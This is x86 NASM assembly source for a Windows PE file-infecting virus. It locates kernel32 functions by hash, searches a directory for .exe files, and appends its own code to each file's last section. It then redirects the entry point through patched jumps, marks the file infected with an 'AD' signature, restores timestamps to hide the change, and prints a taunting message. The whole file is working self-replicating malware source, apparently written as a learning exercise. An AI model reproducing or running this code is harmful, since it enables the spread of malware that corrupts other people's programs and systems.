%include "io.inc"
%include "./common.inc"

virusLen equ                end - start

global _main

struc DATA
    .EIP:                     resd 1
    
    ; kernel data
    .kernelAddress:           resd 1
    .nFunctions:              resd 1
    .functionsAddr:           resd 1
    .namesAddr:               resd 1
    .ordinalsAddr:            resd 1

    ; API method addresses
    .ExitProcess:             resd 1 ;removable
    .SetCurrentDirectoryA:    resd 1
    .GetLastError:            resd 1
    .GetStdHandle:            resd 1
    .WriteFile:               resd 1
    .CreateFileA:             resd 1
    .FindFirstFileA:          resd 1
    .FindNextFileA:           resd 1
    .GetFileAttributesA:      resd 1
    .SetFileAttributesA:      resd 1
    .GetFileTime:             resd 1
    .GetFileSize:             resd 1
    .CreateFileMappingA:      resd 1
    .MapViewOfFile:           resd 1
    .SetFileTime:             resd 1
    .CloseHandle:             resd 1
    .UnmapViewOfFile:         resd 1
    .SetFilePointer:          resd 1
    .SetEndOfFile:            resd 1
    .GetBinaryType:           resd 1

    ; directory listing data
    .search:                  resb 592
    
    ; infection data
    .fileAlign:               resd 1
    .memoryToMap:             resd 1
    .infectionFlag:           resd 1
    .fileOffset:              resd 1    ;removable
    .fileAttributes:          resd 1
    .newFileSize:             resd 1
    .fileHandle:              resd 1
    .lastWriteTime:           resq 1
    .lastAccessTime:          resq 1
    .creationTime:            resq 1
    .mapHandle:               resd 1
    .mapAddress:              resd 1
    .PEHeader:                resd 1
    .oldEntryPoint:           resd 1
    .newEntryPoint:           resd 1
    .imageBase:               resd 1
    .oldRawSize:              resd 1
    .newRawSize:              resd 1
    .incRawSize:              resd 1
    .codeSegment:             resd 1
    .lastSegment:             resd 1
    .diskEP:                  resd 1
    .virusAddress:            resd 1
    .virusLocation:           resd 1
    .oldVSOfLast:             resd 1  
    .size:
endstruc


%if DEBUG
section .data
        counter               dd 1
%endif

section .text

_main:
    mov ebp, esp; for correct debugging
    mov eax, DATA.size
    
start:
    call getEIP                     ; retrieving current location
anchor:

    ; create stack frame for the local variables
    push    ebp                     ; save old ebp
    sub     esp, DATA.size          ; allocate local variables
    mov     ebp, esp                ; set ebp for variable indexing

    mov [ebp + DATA.EIP], eax       ; save location EIP
    
    ; Figure out kernel32.dll's location
    mov edi, [FS : 0x30]    ; PEB
    mov edi, [edi + 0x0C]   ; PEB->Ldr
    mov edi, [edi + 0x14]   ; PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry)
    mov edi, [edi]          ; 2nd Entry
    mov edi, [edi]          ; 3rd Entry
    mov edi, [edi + 0x10]   ; Third entry's base address (Kernel32.dll)
    mov [ebp + DATA.kernelAddress] , edi
 
    mov eax, [edi + 0x3C]   ; kernelAddress points to the DOS header, read PE RVA at 0x3C
    add eax, edi            ; eax has the virtual address of the PE header
    mov eax, [eax + 0x78]   ; The export table RVA is at 0x78 from the start of PE header
    add eax, edi            ; eax has the virtual address of the export table
    mov ecx, [eax + 0x14]   ; The number of functions is at 0x14 in the export table
    mov [ebp + DATA.nFunctions], ecx
    mov ecx, [eax + 0x1C]   ; RVA of array of function RVAs is at 0x1c
    add ecx, edi            ; convert to virtual address
    mov [ebp + DATA.functionsAddr], ecx; save
    mov ecx, [eax + 0x20]   ; RVA of array of function name RVAs is at 0x20
    add ecx, edi            ; convert to virtual address
    mov [ebp + DATA.namesAddr], ecx    ; save
    mov ecx, [eax + 0x24]   ; RVA of array of function ordinals is at 0x24
    add ecx, edi            ; convert to virtual address
    mov [ebp + DATA.ordinalsAddr], ecx ; save

    mov ecx, [ebp + DATA.nFunctions]    ; loop counter
    mov esi, [ebp + DATA.namesAddr]     ; iterate over array of functions names,
                             ; which are pointers to zero-terminated strings
loopOverNames:
    xor edx, edx             ; edx will store the place where to put the address of the function
    mov eax, [esi]           ; read the pointer to the name string
    add eax, edi             ; convert to virtual address
        push ecx
        xor ebx, ebx  ; the hash code
        xor ecx, ecx  ; the next character
     hashLoop:
        mov cl, byte [eax]
        cmp cl, 0
        jz hashDone
        mov edx, ebx  ; save old hash
        shl ebx, 5    ; multiply by 32
        sub ebx, edx  ; subtract a hash, i.e. multiply by 31
        add ebx, ecx  ; add the next character
        inc eax
        jmp hashLoop
     hashDone:
        pop ecx

switch:
    cmp ebx, ExitProcessHash    ; compare to the hash of the function
    jne next1                   ; if not equal cascade down
    lea edx, [ebp + DATA.ExitProcess]      ; if found, put the address of the appropriate memory cell in edx
    jmp save                    ; break the switch
next1:
    cmp ebx, SetCurrentDirectoryAHash
    jne next2
    lea edx, [ebp + DATA.SetCurrentDirectoryA]
    jmp save
next2:
    cmp ebx, GetLastErrorHash
    jne next3
    lea edx, [ebp + DATA.GetLastError]
    jmp save
next3:
    cmp ebx, GetStdHandleHash
    jne next4
    lea edx, [ebp + DATA.GetStdHandle]
    jmp save
next4:
    cmp ebx, WriteFileHash
    jne next5
    lea edx, [ebp + DATA.WriteFile]
    jmp save
next5:
    cmp ebx, CreateFileAHash
    jne next7
    lea edx, [ebp + DATA.CreateFileA]
    jmp save
next7:
    cmp ebx, FindFirstFileAHash
    jne next8
    lea edx, [ebp + DATA.FindFirstFileA]
    jmp save
next8:
    cmp ebx, FindNextFileAHash
    jne next9
    lea edx, [ebp + DATA.FindNextFileA]
    jmp save
next9:
    cmp ebx, GetFileAttributesAHash
    jne next10
    lea edx, [ebp + DATA.GetFileAttributesA]
    jmp save
next10:
    cmp ebx, SetFileAttributesAHash
    jne next11
    lea edx, [ebp + DATA.SetFileAttributesA]
    jmp save
next11:
    cmp ebx, GetFileTimeHash
    jne next12
    lea edx, [ebp + DATA.GetFileTime]
    jmp save
next12:
    cmp ebx, SetFileTimeHash
    jne next13
    lea edx, [ebp + DATA.SetFileTime]
    jmp save
next13:
    cmp ebx, GetFileSizeHash
    jne next14
    lea edx, [ebp + DATA.GetFileSize]
    jmp save
next14:
    cmp ebx, CreateFileMappingAHash
    jne next15
    lea edx, [ebp + DATA.CreateFileMappingA]
    jmp save
next15:
    cmp ebx, MapViewOfFileHash
    jne next16
    lea edx, [ebp + DATA.MapViewOfFile]
    jmp save
next16:
    cmp ebx, UnmapViewOfFileHash
    jne next17
    lea edx, [ebp + DATA.UnmapViewOfFile]
    jmp save
next17:
    cmp ebx, SetFilePointerHash
    jne next18
    lea edx, [ebp + DATA.SetFilePointer]
    jmp save
next18:
    cmp ebx, SetEndOfFileHash
    jne next19
    lea edx, [ebp + DATA.SetEndOfFile]
    jmp save
next19:
    cmp ebx, CloseHandleHash
    jne next20
    lea edx, [ebp + DATA.CloseHandle]
    jmp save
next20:

    jmp discard
save:
    pusha
    mov eax, [ebp + DATA.nFunctions]   ; compute index of function name
    sub eax, ecx
    shl eax, 1              ; multiply index by 2
    add eax, [ebp + DATA.ordinalsAddr] ; compute address of ordinal
    xor ebx, ebx
    mov bx, word [eax]      ; read ordinal
    shl ebx, 2              ; prepare to read function address, multiply ordinal by 4
    add ebx, [ebp + DATA.functionsAddr]; compute address of function address
    mov ebx, [ebx]          ; read function RVA
    add ebx, edi            ; convert to virtual address
    mov [edx], ebx          ; save the address
    popa
discard:
    add esi, 4
    dec ecx
    jnz loopOverNames
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop


    ; Now we begin with the business of infecting some files

    ; SetCurrentDirectory
    mov     ebx, [ebp + DATA.EIP]
    add     ebx, directory - anchor
    push    ebx
    call    [ebp + DATA.SetCurrentDirectoryA]
 
 
    ; find first file
    lea     ebx, [ebp + DATA.search]
    push    ebx                ; Push the address of the search record
    mov     ebx, [ebp + DATA.EIP]         ; Compute pointer to file mask
    add     ebx, exestr - anchor
    push    ebx                ; Push the address of file mask
    call    [ebp + DATA.FindFirstFileA]
    cmp     eax, -1
    jz      done
    mov     edi, eax            ; edi will store the file handle
    mov     esi, [ebp + DATA.search + 44]  ; read pointer to file name
    mov     ecx, [ebp + DATA.search + 32]  ; read file size (lower 4 bytes)
    call	  InfectFile   
again:    
    lea     ebx, [ebp + DATA.search]
    push    ebx                 ; Push the address of the search record
    mov     ecx, edi
    push    ecx			; Push the file handle
    call    [ebp + DATA.FindNextFileA]
    cmp     eax, 0
    jz      done
    PRINT_FILE [ebp + DATA.search + 44]
    mov     esi, [ebp + DATA.search + 44]
    mov     ecx, [ebp + DATA.search + 32]
    call	  InfectFile
    PRINT_TRACE
    jmp     again

     
done:
    ; hStdOut = GetstdHandle(STD_OUTPUT_HANDLE)
    push    -11
    call    [ebp + DATA.GetStdHandle]
    mov     edx, eax

    ; WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, lpOverlapped);
    ;mov     eax, [EIP]
    ;add     eax, overlapped - anchor
    ;push    eax
    ;push    overlapped              ; lpOverlapped
; TODO - make this overlapped shit work
    push    NULL
    push    NULL                    ; &lpNumberOfBytesWritten
    push    message_end - message   ; nNumberOfBytesToWrite
    mov     eax, [ebp + DATA.EIP]
    add     eax, message - anchor
    push    eax                     ; lpBuffer
    push    edx                     ; hFile
    call    [ebp + DATA.WriteFile]

    add     esp, DATA.size          ; de-allocate local variables
    pop     ebp                     ; restore stack

    jmp     end                     ; Get the fuck out


;=====================================================================================
;=====================================================================================
;                           END OF VIRUS EXECUTION BLOCK                                
;=====================================================================================
;=====================================================================================

getEIP:
    mov eax, [esp]
    retn

;; HELPER FUNCTIONS

InfectFile:
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; prepare infection:                                ;;
;;    - esi = filename                               ;;
;;    - ecx = filesize                               ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    pushad								   ; Save all registers
 
    PRINTD "originalFileSize", ecx
    mov	  [ebp + DATA.newFileSize], ecx          ; Save file size, old size at this point
    mov     ebx, 0
    mov	  [ebp + DATA.infectionFlag], ebx        ; Reset the infection flag
    add	  ecx, virusLen                          ; ECX = victim filesize + virus
    add	  ecx, 1000h						           ; ECX = victim filesize + virus + 1000h
    mov     [ebp + DATA.memoryToMap], ecx          ; Memory to map
    PRINT_TRACE ;1
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; save the original attributes                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov	  [ebp + DATA.fileOffset], esi			 ; ESI = pointer to filename ***
    lea     ebx, [ebp + DATA.search + 44] 
    push	  ebx                                    ; Address to filename
    call    [ebp + DATA.GetFileAttributesA]        ; Get the file attributes
    cmp	  eax, 0
    mov	  [ebp + DATA.fileAttributes], eax		
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; set the nomral attributes to the file             ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push	  80h                         ; 80h = FILE_ATTRIBUTE_NORMAL
    lea     ebx, [ebp + DATA.search + 44] 
    push	  ebx                         ; Address to filename
    call    [ebp + DATA.SetFileAttributesA]                         ; Get the file attributes

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; open the file                                     ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push    0                            ; File template
    push    0                            ; File attributes
    push    3                            ; Open existing file
    push	  0                            ; Security option = default
    push	  1                            ; File share for read
    mov     ebx, 80000000h
    or      ebx, 40000000h
    push	  ebx                          ; General write and read
    lea     ebx, [ebp + DATA.search + 44] 
    push	  ebx                          ; Address to filename
    call    [ebp + DATA.CreateFileA]     ; create the file
                                         ; EAX = file handle
 
    mov     [ebp + DATA.fileHandle], eax ; Save file handle
    cmp     eax, -1                      ; error ?
    je      InfectionError					 ; cant open the file ?
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; save the following:                               ;;
;;    - File creation time                           ;;
;;    - Last write time                              ;;
;;    - Last access time                             ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    lea     ebx, [ebp + DATA.lastWriteTime]
    push    ebx
    lea     ebx, [ebp + DATA.lastAccessTime]
    push    ebx
    lea     ebx, [ebp + DATA.creationTime]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.GetFileTime]      ; save time fields ;FIXME
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; create file mapping for the file                  ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push    0                             ; Filename handle = NULL
    mov     ebx, [ebp + DATA.memoryToMap] ; Max size
    push    ebx
    push    0                             ; Min size (no need)
    push    4                             ; Page read and write
    push    0                             ; Security attributes
    mov     ebx, [ebp + DATA.fileHandle]  ; File handle
    push    ebx
    call    [ebp + DATA.CreateFileMappingA]   ; map file to memory
									                ; EAX = new map handle
 
    mov     [ebp + DATA.mapHandle], eax	  ; Save map handle
    cmp     eax, 0							  ; Error ?
    je      CloseFile                     ; Cant map file ?
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; map the view of that file                         ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    
    PRINTD "memoryToMap", [ebp + DATA.memoryToMap]
    mov     ebx, [ebp + DATA.memoryToMap] ; # Bytes to map
    push    ebx
    push	  0						            ; File offset low
    push	  0						            ; File offset high
    push	  2						            ; File Map Write Mode
    mov     ebx, [ebp + DATA.mapHandle]   ; File Map Handle
    push    ebx
    call    [ebp + DATA.MapViewOfFile]    ; map file to memory
 
    cmp     eax, 0       					  ; Error ?
    je      CloseMap						  ; Cant map view of file ?
    mov     esi, eax						  ; ESI = base of map
    mov     [ebp + DATA.mapAddress], esi             ; Save base of map
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; check whether the mapped file is a PE file        ;;
;; and see if its already been infected              ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    cmp	  word [esi], 0x5A4D ;'ZM'        ; Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
    jne	  UnmapView                       ; Error ?
    cmp	  word [esi + 38h], 0x4144 ;'AD'  ; Already infected ?
    jne	  OkGo                            ; Is it a PE EXE file ?
    mov	  word [ebp + DATA.infectionFlag], 0FFh      ; Mark it
    jmp	  UnmapView                       ; Error ?
 
OkGo:
    mov	  ebx, [esi + 3ch]                ; EBX = PE Header RVA
    cmp	  word [esi + ebx], 0x4550 ;'EP'  ; Is it a PE file ?
    jne	  UnmapView                       ; Error ?
    PRINT_TRACE ;2
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; If the file is not EXE, is already infected or is ;;
;; not a PE file, we proceed to unmap the view of    ;;
;; file, otherwise parse the PE Header.              ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    add	  esi, ebx						      ; (ESI points to PE header)
    mov	  [ebp + DATA.PEHeader], esi        ; Save PE header
    mov	  eax, [esi + 28h]				 
    mov	  [ebp + DATA.oldEntryPoint], eax   ; Save Entry Point of file
    mov	  eax, [esi + 34h]                  ; Find the Image Base
    mov	  [ebp + DATA.imageBase], eax       ; Save the Image Base
    mov	  eax, [esi + 3ch]			
    mov	  dword [ebp + DATA.fileAlign], eax ; Save File Alignment ; (EAX = File Alignment)
    PRINT_TRACE ;3

    mov	  ebx, [esi + 74h]                  ; Number of directories entries, PE + 0x74
    shl	  ebx, 3							      ; * 8 (size of data directories)
    add     ebx, 78h                          ; add size of COFF header
    add     ebx, [ebp + DATA.PEHeader]        ; EAX = address of the .text section
    mov     [ebp + DATA.codeSegment], ebx
    PRINT_TRACE ;4
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Locate the last section in the PE                 ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push	  esi
 
    mov	  ebx, [esi + 74h]            ; Number of directories entries
    shl	  ebx, 3							; * 8 (size)
    xor	  eax, eax
    mov	  ax, word [esi + 6h] 			; AX = number of sections
    dec	  eax                         ; Look for the last section ending
    mov	  ecx, 28h						; ECX = size of sections header
    mul	  ecx                         ; EAX = ECX * EAX
    add	  esi, 78h
    add	  esi, ebx
    add	  esi, eax						; ESI = Pointer to the last section header
    mov     [ebp + DATA.lastSegment], esi

    PRINT_TRACE ;5

    mov     ebx, [ebp + DATA.codeSegment]          
    mov     eax, [ebx + 20]                        ; pointer to raw data of code segment
    mov     ebx, [ebp + DATA.codeSegment]          
    add     eax, [ebx + 8]                         ; virtual size of code segment
    mov     [ebp + DATA.diskEP], eax               ; where exectuable code is (entryPoint will jump here)

    PRINT_TRACE ;6

    mov     eax, [ebp + DATA.imageBase] ; ESI = Pointer to the last section header
    add     eax, [esi + 12]             ; VirtualAddress
    add     eax, [esi + 8]              ; VirtualSize
    mov     [ebp + DATA.virusAddress], eax

    PRINT_TRACE ;7
                                        ; ESI = Pointer to the last section header
    mov     eax, [esi + 20]             ; reading PointerToRawData
    add     eax, [esi + 8]              ; reading VirtualSize
    mov     [ebp + DATA.virusLocation], eax

    PRINT_TRACE ;8

    pop	  ebx                         ; restore old peheader into ebx
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

    or      dword [esi + 24h], 00000020h    ; Set [CWE] flags (CODE)
    or      dword [esi + 24h], 20000000h    ; Set [CWE] flags (EXECUTABLE)
    or      dword [esi + 24h], 80000000h    ; Set [CWE] flags (WRITABLE) 

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; The flags tell the loader that the section now    ;;
;; has executable code and is writable               ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [esi + 0x10]               ; EAX = size of raw data in this section (ESI = Pointer to the last section header)
    mov     [ebp + DATA.oldRawSize], eax    ; Save it
    mov     ecx, [esi + 0x08]
    mov     [ebp + DATA.oldVSOfLast], ecx
    add     dword [esi + 0x08], virusLen    ; Increase virtual size
    PRINTD "oldRawSize", [ebp + DATA.oldRawSize]
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Update ImageBase                                  ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [esi + 0x08]             ; Get new size in EAX
    add     eax, [esi + 0x0C]             ; + section rva
    mov     [ebx + 0x50], eax
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; The size of raw data is the actual size of the    ;;
;; data in the section, The virtual size is the one  ;;
;; we must increase with our virus size, Now after   ;;
;; the increasing, lets check how much did we mess   ;;
;; the file align, To do that we divide the new size ;;
;; to the filealign value and we get as a reminder   ;;
;; the number of bytes to pad                        ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [esi + 0x08]           ; Get new size in EAX
    mov     ecx, [ebp + DATA.fileAlign]				; ECX = File alignment
    div     ecx                         ; Get remainder in EDX
    mov     ecx, [ebp + DATA.fileAlign]				; ECX = File alignment
    sub     ecx, edx						; Number of bytes to pad
    mov     [esi + 0x10], ecx				; Save it
    PRINT_TRACE ;9
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Now size of raw data = number of bytes to pad     ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [esi + 0x08] 			; Get current VirtualSize
    add     eax, [esi + 0x10]				; EAX = SizeOfRawdata padded
    mov     [esi + 0x10], eax				; Set new SizeOfRawdata
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Now size of raw data = old virtual size +         ;;
;; number of bytes to pad                            ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     [ebp + DATA.newRawSize], eax				; Save it
    PRINTD "newRawSize", [ebp + DATA.newRawSize]
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; The virus will be at the end of the section, In   ;;
;; order to find its address we have the following   ;;
;; formula                                           ;;
;;                                                   ;;
;; VirtualAddress + VirtualSize - VirusLength        ;;
;;      + RawSize = VirusStart                       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [ebp + DATA.codeSegment]
    mov     ebx, [ebp + DATA.codeSegment]
    mov     eax, [ebx + 0x0C]     ; Reading code segment's RVA
    add     eax, [ebx + 0x08]      ; Add the size of the segment
    PRINT_TRACE;11
    mov     [ebp + DATA.newEntryPoint], eax			; EAX = new EIP, and save it
    PRINT_TRACE;12
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Here we compute with how much did we increase     ;;
;; the size of raw data                              ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [ebp + DATA.oldRawSize]				; Original SizeOfRawdata
    mov     ebx, [ebp + DATA.newRawSize]				; New SizeOfRawdata
    sub     ebx, eax						; Increase in size
    mov     [ebp + DATA.incRawSize], ebx				; Save increase value
    PRINT_TRACE ;13
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Compute the new file size                         ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [esi + 0x14]				; Read PointerToRawData from last section's header
    PRINTD "PointerToRawData", eax
    add     eax, [ebp + DATA.newRawSize]				; Add size of new raw data
    mov     [ebp + DATA.newFileSize], eax 			; EAX = new filesize, and save it
    PRINTD "newFileSize", [ebp + DATA.newFileSize]
    
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Now prepare to copy the virus to the host, The    ;;
;; formulas are                                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     eax, [ebp + DATA.diskEP]				; Align in memory to map address
    add     eax, [ebp + DATA.mapAddress]
    
    mov     [eax], byte 0xE9                   ; relative near jump instruction
    mov     ebx, [ebp + DATA.lastSegment]
    mov     ebx, [ebx + 12]                    ; lastSegment address
    PRINTH "lastSegment address", ebx
    mov     ecx, [ebp + DATA.codeSegment]
    sub     ebx, [ecx + 12]                    ; - codeSegment address
    PRINTH "codeSegment address", [ecx]
    add     ebx, [ebp + DATA.oldVSOfLast]      ; + lastSegment size
    PRINTH "lastSegment size", [ecx]
    mov     ecx, [ebp + DATA.codeSegment]                            
    sub     ebx, [ecx + 8]                     ; - codeSegment size
    PRINTH "codeSegment size", [ecx]
    sub     ebx, 5                             ; subtract length of the jump instruction (it takes up 5 bytes of space)
    mov     [eax + 1], ebx                     ; = 4 byte address
    PRINTH "relative address jump", ebx
    PRINT_TRACE ;14

    mov     edi, [ebp + DATA.virusLocation]    ; Location to copy the virus to
    add     edi, [ebp + DATA.mapAddress]
    mov     eax, [ebp + DATA.EIP]
    lea     esi, [eax - 5]                     ; Location to copy the virus from
    mov     ecx, virusLen                      ; Number of bytes to copy
    rep     movsb                              ; Copy all the bytes
    PRINT_TRACE ;15

    mov     eax, virusLen
    PRINTD "virusLen", eax
    add     eax, [ebp + DATA.virusLocation]
    add     eax, [ebp + DATA.mapAddress]

    PRINT_TRACE ;16
    
        mov     ecx, [ebp + DATA.oldEntryPoint]
        PRINTH  "oldEntryPoint", ecx
        mov     ecx, [ebp + DATA.codeSegment]
        PRINTH  "codeSegment", ecx

    ; Transfer execution to the host entry point
    mov     ecx, [ebp + DATA.codeSegment]
    add     ebx, [ecx + 8]                      ; add Size of CodeSegment
    sub     ebx, [ebp + DATA.oldEntryPoint]     ; subtract old entry point
    add     ebx, 0x1000                         ; correct for BaseOfCode
    add     ebx, 0xA                            ; correct for 2 near JMPs
    add     ebx, virusLen                       ; add virusLength
    neg     ebx
    mov     [eax], byte 0xE9
    mov     [eax + 1], ebx
    PRINT_TRACE ;17
    PRINTH "ebx", ebx
 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Now, lets alter furthur the PE header by marking  ;;
;; the new IP, increasing the total size of the      ;;
;; files image with the increasing of the last       ;;
;; section                                           ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    PRINT_TRACE ;18
    mov     esi, [ebp + DATA.PEHeader]          ; ESI = Address of PE header
    mov     eax, [ebp + DATA.newEntryPoint]     ; Get value of new EIP in EAX
    PRINT_TRACE ;19
    mov     [esi + 28h], eax				        ; Write it to the PE header

    PRINT_TRACE ;20

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Now, lets mark the file as infected               ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     esi, [ebp + DATA.mapAddress]
    mov     word [esi + 38h], 0x4144 ;'AD'  ; Mark file as infected
    PRINT_TRACE ;16
 
UnmapView:
    mov	  ebx, [ebp + DATA.mapAddress]
    push    ebx
    call    [ebp + DATA.UnmapViewOfFile]
    PRINT_TRACE
    
CloseMap:
    mov     ebx, [ebp + DATA.mapHandle]
    push    ebx
    call    [ebp + DATA.CloseHandle]
    PRINT_TRACE
    
CloseFile:
    lea     ebx, [ebp + DATA.lastWriteTime]
    push    ebx
    lea     ebx, [ebp + DATA.lastAccessTime]
    push    ebx
    lea     ebx, [ebp + DATA.creationTime]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetFileTime]                           ; set time fields ;FIXME
    PRINT_TRACE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; In order to properly close the file we must set   ;;
;; its EOF at the exact end of file, So first we     ;;
;; move the pointer to the end and set the EOF       ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    push    0							; First we must set the file
    push    NULL						; Pointer at the end of file (that is the beginning + new file size)
    mov     ebx, [ebp + DATA.newFileSize]
    push    ebx
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetFilePointer]
    PRINT_TRACE
 
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.SetEndOfFile]
    PRINT_TRACE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; And finaly we close the file                      ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     ebx, [ebp + DATA.fileHandle]
    push    ebx
    call    [ebp + DATA.CloseHandle]
    PRINT_TRACE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; Then we must restore file attributes              ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
    mov     ebx, [ebp + DATA.fileAttributes]
    push    ebx
    lea     ebx, [ebp + DATA.search + 44]
    push    ebx                ; Push the address of the search record
    PRINT_TRACE
    call    [ebp + DATA.SetFileAttributesA]
    PRINT_TRACE

    ;PRINT_TRACE
    ;call    [GetLastError]

    jmp     InfectionSuccessful
    
InfectionError:
    stc
    jmp     OutOfHere
    
InfectionSuccessful:
    PRINT_TRACE
    mov eax, 15
    cmp     word[ebp + DATA.infectionFlag], 0FFh
    je      InfectionError
    clc	
    
OutOfHere:
    PRINT_TRACE
    popad								; Restore all registers
    PRINT_TRACE
    retn
    
; end of InfectFile 

    ; continuation of the main function
        
    message:                db 'Im a virus, motherfucker!', 10, 'GET HACKED!!!', 10
    message_end:      
    directory:              db "C:\Assembly\Dummies\", 0
    exestr:                 db "*.exe", 0
    overlapped:             istruc OVERLAPPED
        at offset,          dd 0xFFFFFFFF
        at offsetHigh,      dd 0xFFFFFFFF
    iend
    
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
end:

    retn
